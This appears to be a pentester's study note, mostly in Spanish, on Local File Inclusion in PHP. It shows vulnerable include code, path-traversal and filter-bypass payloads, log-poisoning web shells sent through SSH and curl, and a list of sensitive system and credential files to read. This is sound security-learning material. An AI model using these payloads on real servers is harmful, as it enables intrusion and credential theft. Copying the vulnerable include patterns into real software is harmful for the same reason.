# ¿ Que es un **LFI** ?

El **LFI** es una vulnerabilidad de seguridad informática que se produce cuando una aplicación web **no valida adecauadamente** las entradas del usuario, permitiendo a un atacante **acceder a archvios locales** en el servidor web.

Muchas veces, los atacantes aprovechas el **FLI** al abusar de parámetros de entrada en la aplicación web. Los parámetros de entrada son datos que los usuarios ingresan en la aplicación web, como las URL o los campos de formulario. Los atacantes pueden manipular los parámetros de entrada para incluir rutas de archivo local en la solicitud, lo que puede permitires acceder a archivos en el servidor web. Esta técnica se conoce como **"Path Traversal"** y se utiliza comúnmente en ataques de **LFI**.

---
# Explotación 

Para enumerar los posibles **LFI** y su respectiva explotación lo vamos a hacer de manera local junto a un archivo php para levantar nuestro servicio de apache, de esta manera, podemos ver como un desarrollador podria encarar el intento de **LFI** asi como **burlarlo**. 

#### Archivo index.php
```php
	$filename = $_GET['file'];
	include($filename); 
```

Esto seria la **LFI** más basica, ya que directamente es confia en el input del usuario, donde se lee una query de la url con nombre file para incluirla a invel de sistema. Con poner en la url `....?file=/etc/passwd` estariamos leyendo archivos locales del sistema.

#### Intento triste de sanitización
```php
	$filename = $_GET['file'];
	include("/var/www/html" . $filename);
```

Este "intento" de sanitización intenta obligar al usuario a introducir un arhivo de manera que se lo concatena con la ruta /var/www/html intentando obligar asi a que el archivo se encuentre en esta ruta, pero burlarlo, una vez más es posible, ya que jugando con **Path Traversal** se puede realizar ingresando en la url  `...?file=../../../../../../../etc/passwd` estariamos volviendo a leer archivos locales del sistema.

#### Segundo intento de sanitización 
```php
	$filename = $_GET['file'];
	$filename = str_replace("../", "", $filename);
	include($filename); 
```

En este nuevo intento, el desarrollador podria estar intentando evitar un **Path Traversal** de manera que intenta remplazar los valores `../` por `''` , es decir que esta eliminando de nuestro input los ../, pero, una vez más esto sigue siendo vulnerable, ya que este remplazo no es de manera recursiva, por lo que si ahora ingresamos en la url el valor de `...?file=....//....//....//....//....//....//....//....//....//....//etc/passwd` estariamos una vez más volviendo a leer archivos locales del sistema.

#### Jugando con regex
```php
	$filename = $_GET['file'];
	$filename = str_replace("../", "", $filename);
	if ( preg_match("/\/etc\/passwd/", $filename) === 1){
    echo "\n[!] No es posible visualizar el contenido de este archivo.\n"; 
	}else{  
    include("/var/www/html/" . $filename);
	}
	```

En este caso, no solo esta intentando evitar un **Path Traversal** como anteriormente si no que tambien esta jugando con regex para evitar la string `/etc/passwd`, pero esto sigue siendo vulnerable, no solo por el hecho de que jugando con `....//` se puede listar cualquier archivo, si no que tambien, podriamos listar el etc/passwd ya que la regex filtra por exctamente /etc/passwd por lo que podriamos ingrear `/etc/////./././///////passwd` y seguiriamos pudiendo listar este y cualquier archivo local del sistema.  (Se pueden ingresar cuantas barras '/' y puntos '.' querramos.)

Tambien a nivel de sistema, cuando usamos el `?` se pueden buscar archivos, por ejemplo `cat /e?c/pa??wd`. 

#### Forzando extensiones de archvios
```php
$filename = $_GET['file'];
	$filename = str_replace("../", "", $filename);
	include("/var/www/html/" . $filename . ".php"); 
```

En este caso el desarrollador estaria intentando forzarnos a que lo que ingresemos tenga la extención .php, por lo que si quisieramos ingresar /etc/passwd estariamos ingresando /etc/passwd.php (En caso de sortear todo tipo de validación posible). En este caso, lo que podriamos hacer es hacer uso de un **NULL Byte**, es importante aclarar que esto funciona para versiones antiguas de php y no actuales. Solo haria falta poner en la url 
`...?file=....//....//....//....//....//....//....//....//....//etc/passwd%00`, el **%00** es un null Byte, lo cual anula lo posterior al mismo, anulando asi la extención '.php'. 

Tambien si se hiciera una validación tal que  `if(substr($argv[1],-6,6)!="passwd") include($argv[1]);` asi, en donde se evalua que los ultimos 6 caracteres no sean "passwd", para versiones antiguas de php, podriamos utilizar el `/.` para burlar esto, de manera que si ingresamos `/etc/passwd/.` estariamos burlando la validación. Lo mismo que si se utilizara lo mismo para validar extenciones, por ejemplo`if(substr($argv[1],-4,4)!=".txt") include($argv[1]);`, de esta manera no podriamos ver  archivos .txt, pero si hicieramos `file.txt/.` una vez más, estariamos burlando esto. 

----

#  Log Poisoning - ( **LFI** migrado a [[RCE - (Remote Command Execution)]] )

El **Log Poisoning** es una técnica de ataque en la que un atacante **manipula** los **archivos de registro (logs)** de una aplicación web para lograr un resultado malintencionado. Esta técnica puede ser utilizada en conjunto con una vulnerabilidad **LFI** para lograr un [[RCE - (Remote Command Execution)]].  

Esto se puede dar abusando de los archivos de logs de ssh, Mail, Apache, etc.

- ## SSH 
Podriamos desde un **LFI** ver la ruta `/var/log/auth.log` o `/var/log/btmp`, entre otras, para ver los logs de SSH, y de esta manera, en caso de que los podamos ver, envenenar el log (**Log Poisoning**) intentando conectarnos a ssh por ejemplo con el comando `ssh '<?php system($_GET["cmd"]); ?>'@192.168.1.38`. 

- ## Apache 
Podriamos desde un **LFI** ver la ruta `/var/log/apache2/access.log`, entre otras, para ver los logs de Apache, y de esta manera, en caso de que los podamos ver, envenenear el log (**Log Poisoning**) intentando hacer un curl a la ruta y inyectando el comando php en el User-Agent con el comando `curl -s -X GET 'http://192.168.1.38' -d 'User-Agent: <?php system($_GET["cmd"]); ?>'` o con  `curl -s -X GET 'http://192.168.1.38' -A '<?php system("whoami"); ?>'`.

-----

# LFI to [[RCE - (Remote Command Execution)]] a través de phpinfo()

Cuando tenemos un recurso en una web el cual nos lista la función **phpinfo()**, si tenemos un **LFI** podríamos derivarlo a un [[RCE - (Remote Command Execution)]] siempre y cuando la funcionalidad **file_uploads = On**, en caso de que esto  sea así, tendríamos un *RCE*. 

Con [[Burpsuite]] deberíamos interceptar la petición al recurso en donde se lista el **phpinfo()** y *cambiar el método GET a POST* así como también simular el formato que aparece cuando enviamos archivos, esto lo podemos hacer googleando ["como es el formato del content type cuando subimos archivos"](https://stackoverflow.com/questions/14962592/whats-content-type-value-within-a-http-request-when-uploading-content)  y nos encontraremos con el siguiente formato: 

`Content-Type: multipart/form-data;boundary=<UN_NOMBRE_X>`

`--<UN_NOMBRE_X>` 
`Content-Disposition: form-data; name="name"; filename=<file_to_upload.extención>`
`Content-Type: text/plain`

`<content_file_to_upload>`
`--<UN_NOMBRE_X>`

De esta manera podríamos intentar subir un archivo *php* el cual ejecute una determinada acción, en caso de que este ataque sea exitoso, podríamos ver en la respuesta del lado del servidor, que si filtramos por el nombre del archivo que hayamos subido, veríamos algo como lo siguiente: 

**(
   \[name\] =&gt; \<file_to_upload.extención>
   \[type\] =&gt; text/plain
   \[tmp_name\] =&gt; /tmp/phpLQnUDn
   \[error\] =&gt; 0
   \[size\] =&gt; 71
)**

De esta manera se nos proporciona el directorio temporal en el que fue creado, en este ejemplo **\[tmp_name\] =&gt; /tmp/phpLQnUDn** por lo que si ahora, con el **LFI** apuntamos a la ruta **"/tmp/phpLQnUDn/<file_to_upload.extención>"**, no tendríamos nada. Por que? Por que como lo crea, inmediatamente lo borra, ya que es un archivo temporal, por lo que habría que jugar con [[Race Conditions]] para que en algún momento logre ejecutarse el código de manera óptima.

Obvio que es lo podemos hacer con [scripts](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/phpinfolfi.py) los cuales ya están automatizados 

----
# -> Cheatsheets: + [HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion) + [ironhackers](https://ironhackers.es/herramientas/lfi-cheat-sheet/) + [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion) + [OSCP Guide by sushant747](https://sushant747.gitbooks.io/total-oscp-guide/content/local_file_inclusion.html) 

## LFI to RCE via /proc/self/environ

Like a log file, send the payload in the User-Agent, it will be reflected inside the `/proc/self/environ` file 

```powershell 
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1 User-Agent: <?=phpinfo(); ?> 
```

## Credentials File 

For example, if you are exploiting a web service which has a subdomain that asks you for credentials to access (401 status code) and you have the possibility to run a LFI elsewhere, you can try to get the credentials through the .htaccess and .htpasswd files. 

```
/var/www/subdomain/.htpasswd 
```

If the password is encrypted, you can try to crack it using john. 

## See how the program is started

```bash
/proc/self/cmdline
```

## Scheduler Statistics 

```
/proc/schedstat
/proc/self/schedstat 
```

## Looking for process in linux 

``` 
/proc/sched_debug 
/proc/self/sched_debug 
``` 

## Discover internal open ports: 

``` 
/proc/net/tcp 
/proc/net/udp 
``` 

## Look for containers 

``` 
/proc/net/fib_trie 
``` 

## Discover routes in nginx 

``` 
/etc/nginx/sites-enabled/default 
/etc/nginx/sites-available/default 
```

## Discover routes in apache 

```
/etc/apache2/sites-enabled/000-default.conf
```

# Dirs 

Cuando nos sale el tipico alert para loguearnos en una web, por detrás debería existir dos archivos **.htaccess** y **.htpasswd**

## Enumeration:

- ### Puertos abiertos: 
```
/proc/net/tcp
```

```bash
for port in $(cat /proc/net/tcp | awk '{print $2}' | awk '{print $2}' FS=":" | sort -u); do echo "Open port -> $((0x$port))"; done
```

- ### IP que sufre LFI:
```bash
# Ejemplo, si vemos lo sig:
 sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode                                   
  0: 0100007F:9DF3 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 20791 1 00000000db86742e 100 0 0 10 0   
  1: 2601A8C0:9FFC EFED7522:01BB 01 00000000:00000000 00:00000000 00000000  1000        0 433190 1 00000000d81df3b5 20 4 30 10 -1 
  2: 2601A8C0:8A1C 96C6D62C:01BB 01 00000000:00000000 02:00000B2A 00000000  1000        0 200328 2 00000000ed3be9a7 35 4 30 10 -1 
  3: 2601A8C0:80E4 FCD5C50F:01BB 01 00000000:00000000 02:0000079E 00000000  1000        0 199106 2 000000000b021d7c 34 4 29 10 -1 
  4: 2601A8C0:BED8 C3028F68:01BB 01 00000000:00000000 02:000002C2 00000000  1000        0 371528 2 00000000ed2a5810 48 4 0 10 -1  
  5: 2601A8C0:C5E2 37417522:01BB 01 00000000:00000000 02:00005D33 00000000  1000        0 406579 2 0000000004d8efc7 20 4 31 10 -1 
# Nos quedamos con la segunda columna: 
local_address
0100007F:9DF3
2601A8C0:9FFC
2601A8C0:8A1C
2601A8C0:80E4
2601A8C0:BED8
2601A8C0:C5E2
# Y esta vez con el primer argumento tomando de delimitador los ":"
2601A8C0
# Y verificamos la IP del equipo que sufre el LFI: 
echo "$((0xC0)).$((0xA8)).$((0x01)).$((0x26))" #2601A8C0

```

- ### Servicios expuestos:
```
/proc/sched_debug
```

- ### IP's: 
```
/proc/net/fib_trie
```